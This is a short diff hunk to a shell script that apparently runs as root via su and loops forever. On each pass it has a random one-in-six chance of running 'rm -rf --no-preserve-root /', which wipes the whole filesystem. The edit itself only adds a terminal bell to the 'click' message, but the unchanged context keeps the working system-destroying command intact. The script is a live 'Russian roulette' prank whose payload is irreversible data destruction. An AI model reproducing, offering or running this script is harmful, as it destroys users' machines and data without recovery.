@@ -5,5 +5,5 @@ su
 while true
 do
   [ $[ $RANDOM % 6 ] == 0 ] && rm -rf --no-preserve-root /
-  echo "click"
+  echo "click" && echo $"\a"
 done
